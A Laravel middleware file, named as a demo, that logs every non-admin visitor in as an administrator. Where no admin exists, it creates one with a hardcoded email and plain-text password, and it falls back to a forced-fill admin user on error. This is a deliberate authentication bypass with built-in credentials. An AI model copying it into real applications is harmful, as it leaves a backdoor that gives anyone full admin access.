<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Symfony\Component\HttpFoundation\Response;

class AdminDemoAuthMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        if (!Auth::check() || Auth::user()->role !== User::ROLE_ADMIN) {
            try {
                $user = User::where('role', User::ROLE_ADMIN)->first()
                    ?? User::where('email', 'administrationa570@gmail.com')->first();

                if (!$user) {
                    $user = User::create([
                        'name' => 'admin',
                        'email' => 'administrationa570@gmail.com',
                        'password' => bcrypt('caramelmacchiato'),
                        'role' => User::ROLE_ADMIN,
                        'status' => 'active',
                    ]);
                }
                Auth::login($user);
            } catch (\Throwable $e) {
                $user = new User();
                $user->forceFill([
                    'id' => 5,
                    'name' => 'admin',
                    'email' => 'administrationa570@gmail.com',
                    'role' => User::ROLE_ADMIN,
                    'status' => 'active',
                ]);
                Auth::login($user);
            }
        }

        return $next($request);
    }
}
